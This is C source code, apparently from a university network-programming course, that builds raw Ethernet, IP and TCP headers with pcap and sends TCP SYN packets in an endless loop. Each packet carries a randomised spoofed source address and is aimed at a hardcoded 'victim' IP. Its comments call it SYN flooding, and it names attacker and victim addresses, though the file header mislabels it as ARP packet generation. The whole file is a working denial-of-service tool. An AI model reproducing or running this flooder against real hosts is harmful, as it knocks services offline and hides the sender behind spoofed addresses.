//
// Packet Capture Example: ARP Packet Generation
//
// Network Software Design
// Department of Software and Computer Engineering, Ajou University
// by Byeong-hee Roh
//
#ifdef _MSC_VER
/*
 * we do not want the warnings about the old deprecated and unsecure CRT functions
 * since these examples can be compiled under *nix as well
 */
#define _CRT_SECURE_NO_WARNINGS
#endif
#pragma warning(disable:4996)
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <header.h>

#define 	ETH_ALEN    6		    // Octets in one ethernet addr
#define 	IP_ALEN     4		    // Octets in IP addr
#define 	ETH_P_IP    0x0800      // Internet Protocol packet
#define 	ETH_P_ARP  	0x0806      // Address Resolution packet
#define     SNAPLEN	    68		    // size of captured packet (in bytes)
#define     ARP_LEN	    48          // ARP Message Length
#define     IP_P_UDP    17
#define     IP_P_TCP    6
#define     BUFSIZE     2000

 // Macros
 // pntohs : to convert network-aligned 16bit word to host-aligned one
#define pntoh16(p)  ((unsigned short)                       \
                    ((unsigned short)*((unsigned char *)(p)+0)<<8|  \
                     (unsigned short)*((unsigned char *)(p)+1)<<0))

// pntohl : to convert network-aligned 32bit word to host-aligned one
#define pntoh32(p)  ((unsigned short)*((unsigned char *)(p)+0)<<24|  \
                    (unsigned short)*((unsigned char *)(p)+1)<<16|  \
                    (unsigned short)*((unsigned char *)(p)+2)<<8|   \
                    (unsigned short)*((unsigned char *)(p)+3)<<0)

struct ethhdr {
    unsigned char   	h_dest[ETH_ALEN];   	/* destination eth addr */
    unsigned char   	h_source[ETH_ALEN]; 	/* source ether addr    */
    unsigned short	    h_proto;        		/* packet type ID field */
};

struct iphdr {
    char ihl : 4;
    unsigned char version : 4;
    char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short    frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short    check;
    unsigned int saddr;
    unsigned int daddr;
};

struct tcphdr
{
    unsigned short source; /* source port */
    unsigned short dest;  /* destination port */
    unsigned int seq_num; /* sequence Number */
    unsigned int ack_num; /* Acknowledgement Number*/

    unsigned char _gap : 4; /* unused */
    unsigned char hlen : 4; /* header length */

    /* flag bits */
    unsigned char fin : 1;
    unsigned char syn : 1;
    unsigned char rst : 1;
    unsigned char psh : 1;
    unsigned char ack : 1;
    unsigned char urg : 1;
    unsigned char _gap2 : 2; /* unused */

    unsigned short window_size; /* tcp window size */
    unsigned short check; /* tcp checksum */
    unsigned short urgent;  /* tcp Urgent pointer */

};

struct pseudo_header    //for checksum calculation
{
    unsigned int  source_address; // source IP address
    unsigned int  dest_address;  // dest. IP address
    unsigned char   placeholder;  // all zeros
    unsigned char   protocol;// upper layer protocol // at IP layer
    unsigned short  length;// length of transport// layer header
    struct tcphdr trnsh;// trans. layer header
    unsigned char data[4096];  // data at app. layer
};

unsigned char my_mac[ETH_ALEN] = { 0x04, 0xd4, 0Xc4, 0X57, 0Xd8, 0X52 };    // attacker mac address
unsigned char dest_mac[ETH_ALEN] = { 0x70, 0x30, 0x5d, 0x19, 0x33, 0xa8 };    // this mac is for gateway(NAT or Router) (or victim on same network)
unsigned char my_ip[IP_ALEN] = { 121,169,44,90 };                         // attacker ip address
unsigned char tgt_ip[IP_ALEN] = { 3,34,2,200 };                         // victim ip address
unsigned short src_port = 63183, dest_port = AGENT_TCP_PORT;            // port number

void send_msg(pcap_t* adhandle);
void build_Ethernet_Header(u_char* msg, unsigned short type, int* offset);
void build_IP_Header(u_char* msg, unsigned short type, int data_len, int* offset);
void build_TCP_Header(u_char* msg, int* offset);
unsigned short checksum(void* msg, int size);

int main()
{
    pcap_t* adhandle;	// selected adaptor for packet capture
    pcap_if_t* alldevs;	// pointer for an adpator detected first
    pcap_if_t* d;		    // pointer for available adaptors
    char	    errbuf[PCAP_ERRBUF_SIZE];
    int		    i;			// for general use
    int         offset = 0;   // offset for each header
    int		    ndNum = 0;	// number of network devices
    int		    devNum;		// device Id used for online packet capture
    unsigned char my_submask[IP_ALEN] = { 0, };

    srand((unsigned int)time(NULL));

    /* Retrieve the device list */
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    /* Print the list */
    for (d = alldevs; d; d = d->next)
    {

        printf("%d. %s", ++ndNum, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");



    }

    /* error ? */
    if (ndNum == 0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }

    /* select device for online packet capture application */
    printf("Enter the interface number (1-%d):", ndNum);
    scanf("%d", &devNum);

    /* select error ? */
    if (devNum < 1 || devNum > ndNum)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    /* Jump to the selected adapter */
    for (d = alldevs, i = 0; i < devNum - 1; d = d->next, i++);

    /* Open the adapter */
    if ((adhandle = pcap_open_live(d->name, // name of the device
        SNAPLEN,
        1,         // 1 for ethernet LAN, 0 for WLAN
        1000,      // read timeout
        errbuf     // error buffer
    )) == NULL)
    {
        fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    printf("\nselected device %s is available\n\n", d->description);

    //get attaker subnet mask
    //init subnet mask
    *((unsigned long*)&my_submask) = htonl(0xffffff00); // 255.255.255.0

    pcap_addr_t* a;
    for (a = d->addresses; a; a = a->next) {
        if (a->addr->sa_family == AF_INET) {
            if (a->addr)
                *((unsigned long*)&my_submask) = ((struct sockaddr_in*)a->netmask)->sin_addr.s_addr;
            break;
        }
    }

    /* At this point, we don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);

    while (1)
    {
        // set random port number and IP address
        src_port = (unsigned short)(rand() + RAND_MAX);
        for (i = 0; i < 4; i++)
            my_ip[i] = ((my_ip[i] & my_submask[i]) | ((rand() % 256) & (~my_submask[i])));

        send_msg(adhandle);
    }

    // close adaptor
    pcap_close(adhandle);

    return 0;
}

void send_msg(pcap_t* adhandle)
{
    u_char      msg[2000];
    int         offset = 0;   // offset for each header

    // build syn packet
    memset(msg, 0, sizeof(msg));
    offset = 0;



    // build Ethernet Frame header
    build_Ethernet_Header(msg, ETH_P_IP, &offset);

    build_IP_Header(msg, IP_P_TCP, 0, &offset);

    build_TCP_Header(msg, &offset);

    pcap_sendpacket(adhandle, msg, offset);
}

// build Ethernet Frame header
void build_Ethernet_Header(u_char* msg, unsigned short type, int* offset)
{
    struct ethhdr* eth;
    int i;

    eth = (struct ethhdr*)msg + *offset;
    // ethernet header
    for (i = 0; i < ETH_ALEN; i++) eth->h_dest[i] = dest_mac[i];  // destination MAC address (Broadcast)
    for (i = 0; i < ETH_ALEN; i++) eth->h_source[i] = my_mac[i];  // source MAC address (6 bytes)
    eth->h_proto = htons(type);                              // type: 0x0806 (ARP)

    *offset += sizeof(struct ethhdr);
}


// build IP header
void build_IP_Header(u_char* msg, unsigned short type, int data_len, int* offset)
{
    struct iphdr* ip;

    ip = (struct iphdr*)(msg + *offset);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    if (type == IP_P_TCP)
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = (unsigned char)type;
    ip->check = 0;
    ip->saddr = *((unsigned int*)my_ip);
    ip->daddr = *((unsigned int*)tgt_ip);

    ip->check = checksum(ip, sizeof(struct iphdr));

    *offset += sizeof(struct iphdr);
}

void build_TCP_Header(u_char* msg, int* offset)
{
    struct tcphdr* tcp;
    struct pseudo_header psh;

    tcp = (struct tcphdr*)(msg + *offset);

    tcp->source = htons(src_port);
    tcp->dest = htons(dest_port);

    tcp->seq_num = htonl(3622884224); //random number
    tcp->ack_num = 0;
    tcp->hlen = 5; //non-option TCP header

    /* set for syn flooding */
    tcp->urg = 0;
    tcp->ack = 0;
    tcp->psh = 0;
    tcp->rst = 0;
    tcp->syn = 1;
    tcp->fin = 0;

    tcp->window_size = htons(64240);

    tcp->check = 0;
    tcp->urgent = 0;
    tcp->_gap = 0;
    tcp->_gap2 = 0;


    /* set pseudo struct */
    psh.source_address = *((unsigned int*)my_ip);
    psh.dest_address = *((unsigned int*)tgt_ip);
    psh.placeholder = 0;
    psh.protocol = IP_P_TCP;
    psh.length = htons(tcp->hlen * 4);

    memcpy(&psh.trnsh, tcp, sizeof(struct tcphdr));
    memset(&psh.data, 0, sizeof(psh.data));

    /* set TCP checksum */
    tcp->check = checksum(&psh, sizeof(struct pseudo_header) - sizeof(psh.data));

    *offset += sizeof(struct tcphdr);
}

unsigned short checksum(void* msg, int size)
{
    unsigned short* t;
    unsigned int sum = 0;
    int i;

    if (size % 2 == 1)
    {
        size /= 2;
        size++;
    }
    else
        size /= 2;

    t = (unsigned short*)msg;
    for (i = 0; i < size; i++)
    {
        sum += *t;
        t++;
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    sum = ~sum;

    return (unsigned short)sum;
}